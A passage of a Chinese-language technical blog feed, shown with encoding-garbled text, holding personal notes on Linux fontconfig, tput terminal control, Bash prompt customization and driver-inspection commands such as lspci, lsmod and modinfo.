    <content type="html"><![CDATA[<h1 id="æ‰‹åŠ¨å®‰è£…"><a href="#æ‰‹åŠ¨å®‰è£…" class="headerlink" title="æ‰‹åŠ¨å®‰è£…"></a>æ‰‹åŠ¨å®‰è£…</h1><ul><li>ä¸ºå•ä¸ªç”¨æˆ·å®‰è£…ï¼Œå°†å­—ä½“æ”¾å…¥ <code>~/.local/share/fonts</code> ç›®å½•ä¸‹</li><li>ä¸ºç³»ç»Ÿæ‰€æœ‰ç”¨æˆ·å®‰è£…ï¼Œå®‰è£…åˆ° <code>/usr/local/share/fonts</code> ç›®å½•ä¸‹, <code>/usr/share/fonts</code> ç”±åŒ…ç®¡ç†å™¨ç®¡ç†ï¼Œä¸è¦æ‰‹åŠ¨ä¿®æ”¹</li></ul><p>éœ€è¦ç¡®ä¿æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»å–å­—ä½“æ–‡ä»¶çš„æƒé™.</p><h1 id="åå¤‡å­—ä½“é¡ºåº"><a href="#åå¤‡å­—ä½“é¡ºåº" class="headerlink" title="åå¤‡å­—ä½“é¡ºåº"></a>åå¤‡å­—ä½“é¡ºåº</h1><p>Fontconfig ä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ»¡è¶³å½“å‰æ˜¾ç¤ºéœ€æ±‚çš„å­—ä½“ã€‚</p><p>Fontconfig å…è®¸æ¯ä¸ªç”¨æˆ·ä½¿ç”¨ <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> èµ–è°ƒæ•´å­—ä½“çš„é€‰æ‹©é¡ºåº.</p><h1 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h1><h2 id="åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…å­—ä½“"><a href="#åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…å­—ä½“" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…å­—ä½“"></a>åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…å­—ä½“</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">fc</span><span class="hljs-literal">-list</span><br></code></pre></td></tr></table></figure><h2 id="åˆ—å‡ºç‰¹å®šè¯­è¨€çš„å·²å®‰è£…å­—ä½“"><a href="#åˆ—å‡ºç‰¹å®šè¯­è¨€çš„å·²å®‰è£…å­—ä½“" class="headerlink" title="åˆ—å‡ºç‰¹å®šè¯­è¨€çš„å·²å®‰è£…å­—ä½“"></a>åˆ—å‡ºç‰¹å®šè¯­è¨€çš„å·²å®‰è£…å­—ä½“</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>fc-list <span class="hljs-symbol">:lang=<span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure><p>å¦‚ä¸­æ–‡:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>fc-list <span class="hljs-symbol">:lang=<span class="hljs-string">&quot;zh&quot;</span></span><br></code></pre></td></tr></table></figure><p>å¯å®‰è£…:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S extra/noto-fonts-cjk<br></code></pre></td></tr></table></figure><h1 id="Font-configuration"><a href="#Font-configuration" class="headerlink" title="Font configuration"></a>Font configuration</h1><p>Fontconfig æ˜¯ä¸€ä¸ªåº“ï¼Œç”¨äºä¸ºåº”ç”¨ç¨‹åºæä¾›å¯ç”¨çš„å­—ä½“åˆ—è¡¨ï¼ŒåŠé…ç½®å­—ä½“å¦‚ä½•æ¸²æŸ“ã€‚</p><p>Fontconfig çš„é»˜è®¤è·¯å¾„åŒ…å« <code>/usr/share/fonts</code>, <code>/usr/local/share/fonts</code>, <code>~/.local/share/fonts</code></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>å•ç”¨æˆ·é…ç½®æ–‡ä»¶åœ¨ <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> (é€šå¸¸ä¸º <code>$HOME/.config/fontconfig/fonts.conf</code>), å…¨å±€é…ç½®åœ¨ <code>/etc/fonts/local.conf</code>. å•ç”¨æˆ·é…ç½®ä¼˜å…ˆçº§é«˜äºå…¨å±€é…ç½®.</p><p>è·¯å¾„é‡Œé¢æ–‡ä»¶å‰é¢çš„æ•°å­—éœ€è¦åœ¨ 00~99 ä¹‹é—´.</p><p>Fontconfig æŠŠæ‰€æœ‰é…ç½®é›†ä¸­åˆ°ä¸€ä¸ªå•ç‹¬çš„ä¸­å¿ƒæ–‡ä»¶ <code>/etc/fonts/fonts.conf</code> ä¸­, ä¸å»ºè®®ç›´æ¥ä¿®æ”¹.</p><p>Fontconfig é…ç½®æ–‡ä»¶ä½¿ç”¨ XML æ ¼å¼.</p><h3 id="é¢„ç½®"><a href="#é¢„ç½®" class="headerlink" title="é¢„ç½®"></a>é¢„ç½®</h3><p>é¢„ç½®å­˜æ”¾åœ¨ <code>/usr/share/fontconfig/conf.avail</code>.</p><p>å¯ä»¥ç”¨åˆ›å»ºç¬¦å·é“¾æ¥åˆ°æ­¤å¤„çš„å½¢å¼å¯ç”¨.</p><h3 id="åå¤‡å­—ä½“é¡ºåº-1"><a href="#åå¤‡å­—ä½“é¡ºåº-1" class="headerlink" title="åå¤‡å­—ä½“é¡ºåº"></a>åå¤‡å­—ä½“é¡ºåº</h3><p>Fontconfig ä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ»¡è¶³å½“å‰æ˜¾ç¤ºéœ€æ±‚çš„å­—ä½“.</p><p>Fontconfig å…è®¸æ¯ä¸ªç”¨æˆ·é€šè¿‡ <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> è°ƒæ•´å­—ä½“çš„é€‰æ‹©é¡ºåº.</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bash ä¸­ tput ä½¿ç”¨</title>
    <link href="/2022/09/05/Bash-%E4%B8%AD-tput-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/05/Bash-%E4%B8%AD-tput-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/brahmsjiang/article/details/78170238">å‚è€ƒ</a><br><a href="inmp.ailinux.net/tput">å‚è€ƒ</a><br>tput å‘½ä»¤é€šè¿‡å°† terminfo æ•°æ®åº“å¯¹ä½ çš„ç»ˆç«¯ä¼šè¯è¿›è¡Œåˆå§‹åŒ–å’Œæ“ä½œã€‚</p><p>å¯ä»¥ç§»åŠ¨æˆ–æ›´æ”¹å…‰æ ‡ï¼Œæ›´æ”¹æ–‡æœ¬å±æ€§ï¼Œä»¥åŠæ¸…é™¤ç»ˆç«¯å±å¹•çš„ç‰¹æ€§ã€‚</p><h1 id="terminfo"><a href="#terminfo" class="headerlink" title="terminfo"></a>terminfo</h1><p>UNIX ç³»ç»Ÿä¸Šçš„ terminfo æ•°æ®åº“ç”¨äºå®šä¹‰ç»ˆç«¯å’Œæ‰“å°æœºçš„å±æ€§åŠåŠŸèƒ½ï¼ŒåŒ…æ‹¬å„è®¾å¤‡çš„è¡Œæ•°å’Œåˆ—æ•°ä»¥åŠè¦å‘é€è‡³è¯¥è®¾å¤‡çš„æ–‡æœ¬çš„å±æ€§.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="æ”¹å˜å…‰æ ‡å±æ€§"><a href="#æ”¹å˜å…‰æ ‡å±æ€§" class="headerlink" title="æ”¹å˜å…‰æ ‡å±æ€§"></a>æ”¹å˜å…‰æ ‡å±æ€§</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">tput <span class="hljs-attribute">clear</span> # æ¸…å±<br>tput sc # save <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> ä¿å­˜å½“å‰å…‰æ ‡ä½ç½® <br>tput cup <span class="hljs-number">10</span> <span class="hljs-number">13</span> # <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> å°†å…‰æ ‡ç§»åŠ¨åˆ° row10 col13<br>tput civis # <span class="hljs-attribute">cursor</span> invisible å…‰æ ‡ä¸å¯è§<br>tput cnorm # <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">normal</span> å…‰æ ‡å¯è§<br>tput rc # restore <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> å…‰æ ‡è¿”å›ä¸Šæ¬¡ä¿å­˜çš„ä½ç½®<br></code></pre></td></tr></table></figure><h3 id="ç§»åŠ¨å…‰æ ‡å¹¶æ˜¾ç¤ºä¿¡æ¯"><a href="#ç§»åŠ¨å…‰æ ‡å¹¶æ˜¾ç¤ºä¿¡æ¯" class="headerlink" title="ç§»åŠ¨å…‰æ ‡å¹¶æ˜¾ç¤ºä¿¡æ¯"></a>ç§»åŠ¨å…‰æ ‡å¹¶æ˜¾ç¤ºä¿¡æ¯</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tput</span> sc ; <span class="hljs-attribute">tput</span> cup <span class="hljs-number">23</span> <span class="hljs-number">45</span> ; <span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;Input from tput/echo at 23/45&quot;</span> ; <span class="hljs-attribute">tput</span> rc<br></code></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥è®©å…‰æ ‡å…ˆç§»åŠ¨åˆ° (23, 45) è¿™ä¸ªåæ ‡ï¼Œç„¶åæ‰“å° <code>Input from tput/echo at 23/45</code> è¿™å¥è¯ï¼Œæœ€åè¿”å›åŸæ¥çš„ä½ç½®.</p><p>åœ¨æ˜¾ç¤ºäº†ä¿¡æ¯ä¹‹åï¼Œå…‰æ ‡å¿…é¡»ä½¿ç”¨ <code>tput rc</code> è¿”å›åˆ°ä¹‹å‰ä¿å­˜çš„åŸå§‹ä½ç½®.</p><h3 id="æ›´æ”¹å…‰æ ‡çš„å±æ€§"><a href="#æ›´æ”¹å…‰æ ‡çš„å±æ€§" class="headerlink" title="æ›´æ”¹å…‰æ ‡çš„å±æ€§"></a>æ›´æ”¹å…‰æ ‡çš„å±æ€§</h3><p>åœ¨å‘æŸä¸€è®¾å¤‡æ˜¾ç¤ºæ•°æ®æ—¶ï¼Œå°†å…‰æ ‡è½¬æ¢ä¸ºä¸å¯è§å¯ä»¥ä½¿æ•°æ®æ»šåŠ¨æ—¶çš„å±å¹•çœ‹èµ·æ¥æ›´æ•´æ´ï¼Œå¯å…ˆä½¿ç”¨ <code>civis</code> é€‰é¡¹ï¼Œå†ä½¿ç”¨ <code>cnorm</code> é€‰é¡¹.</p><h2 id="æ”¹å˜æ–‡æœ¬å±æ€§"><a href="#æ”¹å˜æ–‡æœ¬å±æ€§" class="headerlink" title="æ”¹å˜æ–‡æœ¬å±æ€§"></a>æ”¹å˜æ–‡æœ¬å±æ€§</h2><p>å¦‚ï¼Œä½¿æ–‡æœ¬åŠ ç²—ï¼Œåœ¨æ–‡æœ¬ä¸‹æ–¹æ·»åŠ ä¸‹åˆ’çº¿ï¼Œæ›´æ”¹èƒŒæ™¯é¢œè‰²å’Œå‰æ™¯é¢œè‰²ï¼Œé€†è½¬é¢œè‰²ç­‰ã€‚</p><ul><li><code>tput setb</code>, set background</li><li><code>tput setf</code>, set foregrounf<br>é¢œè‰²å’Œåˆ†é…çš„æ•°å€¼æœ‰å…³:</li><li>0 : é»‘è‰²</li><li>1 : è“è‰²</li><li>2 : ç»¿è‰²</li><li>3 : é’è‰²</li><li>4 : çº¢è‰²</li><li>5 : æ´‹çº¢è‰²</li><li>6 : é»„è‰²</li><li>7 : ç™½è‰²<br>åæ˜¾å½“å‰é¢œè‰² <code>tput rev</code>.</li></ul><p>ç²—ä½“ä½¿ç”¨ <code>tput bold</code>.</p><p>æ·»åŠ ä¸‹åˆ’çº¿ä½¿ç”¨ <code>tput smul</code>, å»é™¤ä¸‹åˆ’çº¿ä½¿ç”¨ <code>tput rmul</code></p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº Bash çš„ç¾åŒ–</title>
    <link href="/2022/09/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/09/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bash/Prompt_customization">ArchWiki Bash&#x2F;Prompt</a></p><h1 id="Bash-x2F-Prompt-customization"><a href="#Bash-x2F-Prompt-customization" class="headerlink" title="Bash&#x2F;Prompt customization"></a>Bash&#x2F;Prompt customization</h1><h2 id="Prompts"><a href="#Prompts" class="headerlink" title="Prompts"></a>Prompts</h2><p>Bash æœ‰ 4 ä¸ª prompt strings å¯ä»¥è‡ªå®šä¹‰.</p><p>è¿™é‡Œçš„ <code>PS</code> æ˜¯ <code>Prompt Stringl</code> çš„å«ä¹‰:</p><ul><li><code>PS0</code>, åœ¨æ¯æ¬¡å‘½ä»¤è¾“å‡ºåæ˜¾ç¤ºåœ¨ output ä¹‹å‰, å‡ ä¹æ¯ä¸ªå‘½ä»¤éƒ½ä¼šæœ‰è¾“å‡ºï¼Œå®ƒå°±ä½äºè¾“å‡ºä¹‹å‰, é»˜è®¤æ˜¯æ²¡æœ‰çš„</li><li><code>PS1</code>, å…¶ä¸ºåŸºç¡€çš„ prompt, ä¼šæ˜¾ç¤ºåœ¨å‘½ä»¤ä¹‹å‰, å°±æ¯”å¦‚ç°åœ¨çš„ <code>[jie@EVA ~]$</code>, å…¨éƒ¨</li><li><code>PS2</code>, å½“ command éœ€è¦æ›´å¤š input æ—¶æ˜¾ç¤º, å¦‚ <code>echo &lt;&lt; EOF</code> åå‡ºç°çš„ <code>&gt;</code></li><li><code>PS3</code></li><li><code>PS4</code></li></ul><p>æ‰€æœ‰çš„è¿™äº› prompt éƒ½å¯ä»¥åœ¨ <code>~/.bashrc</code> ä¸­è®¾ç½®, å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">PS2</span>=<span class="hljs-string">&#x27;&gt;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="Bash-escape-sequeces"><a href="#Bash-escape-sequeces" class="headerlink" title="Bash escape sequeces"></a>Bash escape sequeces</h3><p>å½“æ‰“å° prompt string æ—¶ï¼ŒBash ä¼šå¯»æ‰¾æŸäº›åæ–œçº¿è½¬ä¹‰çš„å­—ç¬¦ (backslash-escaped characters), ç„¶åæŠŠå®ƒä»¬æ‰©å±•æˆ special strings, å¦‚:</p><ul><li><code>\u</code>, ä¼šè¢«æ‰©å±•æˆå½“å‰ç”¨æˆ·çš„åç§°</li><li><code>\A</code>, ä¼šè¢«æ‰©å±•æˆå½“å‰çš„æ—¶é—´<br>å› æ­¤ï¼Œå¦‚æœ:<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">PS1<span class="hljs-operator">=</span>`\A \u $`<br></code></pre></td></tr></table></figure>å°±ä¼šè¢«æ‰©å±•æˆ <code>17:35 username $</code>.</li></ul><p>åœ¨ <code>man bash</code> ä¸­æŸ¥æ‰¾ <code>PROMTING</code> å¯ä»¥çœ‹åˆ°å…¨éƒ¨åˆ—è¡¨.</p><p>ä»¥ä¸‹ä¸ºæˆ‘è‡ªå·±å¯èƒ½ä¼šç”¨åˆ°çš„:</p><ul><li><code>\d</code>, ä»¥ â€œWeekday Month Dateâ€ çš„å½¢å¼æ˜¾ç¤ºæ—¶é—´</li><li><code>\h</code>, ç¬¬ä¸€ä¸ª <code>.</code> ä¹‹å‰çš„ hostname, ä¸€èˆ¬çš„ hostname ä¸ä¸€å®šæ˜¯ä¸€ä¸ªå•è¯</li><li><code>\H</code>, the hostname</li><li><code>\j</code>, the number of jobs currently managed by shell</li><li><code>\i</code>, the basename of the shellâ€™s terminal device name</li><li><code>\s</code>, shell çš„åå­—</li><li><code>\t</code>, ç”¨ 24 å°æ—¶åˆ¶ â€œHH:MM:SSâ€ æ˜¾ç¤ºå½“å‰æ—¶é—´</li><li><code>\u</code>, å½“å‰ç”¨æˆ·çš„åç§°</li><li><code>\w</code>, å½“å‰ç›®å½•ï¼Œ<code>$HOME</code> è¢«ç®€åŒ–ä¸º <code>~</code> æ³¢æµªçº¿ (tilde)</li><li><code>\[</code>, å¼€å§‹ a sequence of non-printing character, å³ä¸ä¼šæ˜¾ç¤ºå‡ºéæ‰“å°å­—ç¬¦</li><li><code>\]</code>, ç»“æŸ a sequence of non-printing character<br><code>\a</code> èœ‚é¸£ï¼Œ<code>\n</code> æ¢è¡Œç­‰éƒ½æ˜¯ non-printing character.</li></ul><h3 id="Terminfo-escape-sequences"><a href="#Terminfo-escape-sequences" class="headerlink" title="Terminfo escape sequences"></a>Terminfo escape sequences</h3><p>æŸ¥çœ‹å½“å‰ terminal æä¾›çš„ capabilities:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>infocmp<br></code></pre></td></tr></table></figure><p>å‡ºç°åœ¨ <code>=</code> ä¹‹å‰çš„æ˜¯ <code>capability</code> çš„åå­—. å¯åœ¨ <code>/usr/share/terminfo</code> é‡Œé¢æŸ¥çœ‹å…·ä½“å†…å®¹.</p><p>æ¯”å¦‚ <code>setaf</code> ç”¨æ¥è®¾ç½® <code>foreground color of whatever text is printed after it</code></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>tput setaf <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®ä¾‹å­:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GREEN</span>=<span class="hljs-string">&quot;\[<span class="hljs-variable">$(tput setaf 2)</span>\]&quot;</span><br><span class="hljs-attribute">RESET</span>=<span class="hljs-string">&quot;\[<span class="hljs-variable">$(tput sgr0)</span>\]&quot;</span><br><br><span class="hljs-attribute">PS1</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>my prompt<span class="hljs-variable">$&#123;RESET&#125;</span>&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>Bash man page å»ºè®®æŠŠ <code>tput</code> çš„è¾“å‡ºç”¨ <code>\[ \]</code> åŒ…è£¹ã€‚è¿™ä¼šå¸®åŠ© bash å¿½ç•¥éæ‰“å°å­—ç¬¦ (non-printable characters).</p><h3 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h3><p>è¿™æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒçš„å€¼ä¼šåœ¨ <code>PS1</code> æ˜¾ç¤ºä¹‹å‰è¢« evaluated. å¯ç”¨äº resign <code>PS1</code>.</p><h3 id="Escapes-between-command-input-and-output"><a href="#Escapes-between-command-input-and-output" class="headerlink" title="Escapes between command input and output"></a>Escapes between command input and output</h3><p>å¾ˆå¤šå±æ€§åœ¨æ”¹å˜åè®°å¾— reset.</p><h3 id="Customizing-root-prompts"><a href="#Customizing-root-prompts" class="headerlink" title="Customizing root prompts"></a>Customizing root prompts</h3><p>åœ¨ <code>/root</code> ä¸­ä¿®æ”¹ã€‚</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="infocmp-å‘½ä»¤"><a href="#infocmp-å‘½ä»¤" class="headerlink" title="infocmp å‘½ä»¤"></a>infocmp å‘½ä»¤</h3><p>ä¼šæ˜¾ç¤º the number of colors <code>tput</code> works with.</p><h1 id="å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« "><a href="#å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« " class="headerlink" title="å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« "></a>å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« </h1><p><a href="https://b23.tv/8VgYZzp">å‚è€ƒ</a></p><h2 id="bash-æ‰‹å†Œ"><a href="#bash-æ‰‹å†Œ" class="headerlink" title="bash æ‰‹å†Œ"></a>bash æ‰‹å†Œ</h2><p><code>bash 1 printf</code> æ˜¯æŸ¥çœ‹ bash shell ä¸­ <code>printf</code> çš„ä½¿ç”¨.</p><p><code>bash 3 printf</code> å¯ä»¥æŸ¥çœ‹ C è¯­è¨€ä¸­ <code>printf</code> çš„ä½¿ç”¨.</p><p>ä¸€ä¸ªä¾‹å­:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">printf</span> &#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">32</span>m yes \<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27;<br></code></pre></td></tr></table></figure><ul><li><code>\033[</code> è¡¨ç¤ºå¼€å§‹çš„è‰²å½©æ§åˆ¶.</li><li><code>1</code> è¡¨ç¤ºåŠ ç²—</li><li><code>;</code> è¡¨ç¤ºåˆ†éš”</li><li><code>32m</code> è¡¨ç¤ºç»¿è‰²</li><li><code>\033[0m</code>  ä¸¤ä¸ª <code>\033[</code> ä¹‹é—´çš„å†…å®¹æ˜¯èŒƒå›´ï¼Œ<code>0m</code> æ˜¯ç»“æŸ<br>å…·ä½“çš„é¢œè‰²å¯å‚è§ <code>https://misc.flogisoft.com/bash/tip_colors_and_formatting</code>.</li></ul>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux æŸ¥çœ‹è®¾å¤‡å’Œé©±åŠ¨å®‰è£…ç›¸å…³ä¿¡æ¯</title>
    <link href="/2022/09/05/Linux-%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/"/>
    <url>/2022/09/05/Linux-%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m1223853767/article/details/79615011">å‚è€ƒ</a></p><h1 id="åˆ—å‡ºæ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯"><a href="#åˆ—å‡ºæ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯"></a>åˆ—å‡ºæ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯</h1><p><code>lspci</code> å‘½ä»¤å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯ï¼ŒåŒ…æ‹¬å·²ç»å®‰è£…äº†é©±åŠ¨å’Œä¸ºå®‰è£…é©±åŠ¨çš„ç¡¬ä»¶è®¾å¤‡ï¼Œé€šè¿‡ <code>pci</code> æ€»çº¿çš„è¿æ¥æƒ…å†µè¯»å–ä¿¡æ¯.</p><h1 id="åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»åŠ è½½äº†çš„æ¨¡å—-x2F-é©±åŠ¨"><a href="#åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»åŠ è½½äº†çš„æ¨¡å—-x2F-é©±åŠ¨" class="headerlink" title="åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»åŠ è½½äº†çš„æ¨¡å—&#x2F;é©±åŠ¨"></a>åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»åŠ è½½äº†çš„æ¨¡å—&#x2F;é©±åŠ¨</h1><p>ä½¿ç”¨ <code>lsmod</code> å‘½ä»¤.</p><p><code>lsmod</code> å‘½ä»¤åªèƒ½æ˜¾ç¤ºç¼–è¯‘ linux å†…æ ¸æ—¶é€‰ä¸­ä¸º â€œMâ€ çš„é©±åŠ¨ç¨‹åºã€‚</p><h1 id="æŸ¥çœ‹è¯¥è®¾å¤‡çš„é©±åŠ¨æœ‰æ²¡æœ‰å®‰è£…"><a href="#æŸ¥çœ‹è¯¥è®¾å¤‡çš„é©±åŠ¨æœ‰æ²¡æœ‰å®‰è£…" class="headerlink" title="æŸ¥çœ‹è¯¥è®¾å¤‡çš„é©±åŠ¨æœ‰æ²¡æœ‰å®‰è£…"></a>æŸ¥çœ‹è¯¥è®¾å¤‡çš„é©±åŠ¨æœ‰æ²¡æœ‰å®‰è£…</h1><p>ç”¨ dmesg å‘½ä»¤ï¼Œå…¶ä¿¡æ¯è¾ƒå¤šï¼Œéœ€è¦ç”¨ <code>grep</code> è¿‡æ»¤ã€‚</p><p>æ¯”å¦‚æŸ¥çœ‹ä¸ wifi ç›¸å…³çš„:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ dmesg <span class="hljs-string">| grep -i wifi</span><br></code></pre></td></tr></table></figure><h1 id="å•çœ‹æŒ‡å®šæ¨¡å—-x2F-é©±åŠ¨çš„ä¿¡æ¯"><a href="#å•çœ‹æŒ‡å®šæ¨¡å—-x2F-é©±åŠ¨çš„ä¿¡æ¯" class="headerlink" title="å•çœ‹æŒ‡å®šæ¨¡å—&#x2F;é©±åŠ¨çš„ä¿¡æ¯"></a>å•çœ‹æŒ‡å®šæ¨¡å—&#x2F;é©±åŠ¨çš„ä¿¡æ¯</h1><p>ä½¿ç”¨ modinfo å‘½ä»¤.</p><p>alias æŒ‡è¿™ä¸ªæ¨¡å—&#x2F;é©±åŠ¨æ‰€æ”¯æŒçš„ç¡¬ä»¶å‹å·ã€‚</p><h1 id="åŠ è½½é©±åŠ¨"><a href="#åŠ è½½é©±åŠ¨" class="headerlink" title="åŠ è½½é©±åŠ¨"></a>åŠ è½½é©±åŠ¨</h1><p>ç”¨modprobe æˆ– insmod å‘½ä»¤.</p><h1 id="åˆ é™¤ä¸€ä¸ªæ¨¡å—-x2F-é©±åŠ¨"><a href="#åˆ é™¤ä¸€ä¸ªæ¨¡å—-x2F-é©±åŠ¨" class="headerlink" title="åˆ é™¤ä¸€ä¸ªæ¨¡å—&#x2F;é©±åŠ¨"></a>åˆ é™¤ä¸€ä¸ªæ¨¡å—&#x2F;é©±åŠ¨</h1><p>ç”¨ rmmod å‘½ä»¤.</p><h1 id="ç¡®å®šéœ€è¦å®‰è£…é©±åŠ¨çš„ç¡¬ä»¶å‹å·"><a href="#ç¡®å®šéœ€è¦å®‰è£…é©±åŠ¨çš„ç¡¬ä»¶å‹å·" class="headerlink" title="ç¡®å®šéœ€è¦å®‰è£…é©±åŠ¨çš„ç¡¬ä»¶å‹å·"></a>ç¡®å®šéœ€è¦å®‰è£…é©±åŠ¨çš„ç¡¬ä»¶å‹å·</h1><p>æŸ¥çœ‹ <code>/etc/sysconfig/hwconf</code>.</p><p>vendorld æŒ‡çš„æ˜¯ç¡¬ä»¶çš„ç”Ÿäº§å•†ç¼–å·ã€‚</p><p>deviceld æŒ‡è¯¥è®¾å¤‡çš„ç¼–å·ï¼Œä¸€èˆ¬ç”Ÿäº§å•†å’Œè®¾å¤‡ç¼–å·éƒ½æ˜¯å››ä½ã€‚</p><h1 id="æŸ¥æ‰¾ä¸è®¾å¤‡ç›¸å…³çš„ä¿¡æ¯"><a href="#æŸ¥æ‰¾ä¸è®¾å¤‡ç›¸å…³çš„ä¿¡æ¯" class="headerlink" title="æŸ¥æ‰¾ä¸è®¾å¤‡ç›¸å…³çš„ä¿¡æ¯"></a>æŸ¥æ‰¾ä¸è®¾å¤‡ç›¸å…³çš„ä¿¡æ¯</h1><p>åˆ° <code>http://pci-ids.ucw.cz/iii/</code> è¿™ä¸ªç½‘ç«™æŸ¥æ‰¾ã€‚</p><h1 id="å¸¸ç”¨çš„æ£€æµ‹å‘½ä»¤"><a href="#å¸¸ç”¨çš„æ£€æµ‹å‘½ä»¤" class="headerlink" title="å¸¸ç”¨çš„æ£€æµ‹å‘½ä»¤"></a>å¸¸ç”¨çš„æ£€æµ‹å‘½ä»¤</h1><h2 id="ç”¨ç¡¬ä»¶æ£€æµ‹ç¨‹åº-kuduz-æ¢æµ‹æ–°ç¡¬ä»¶"><a 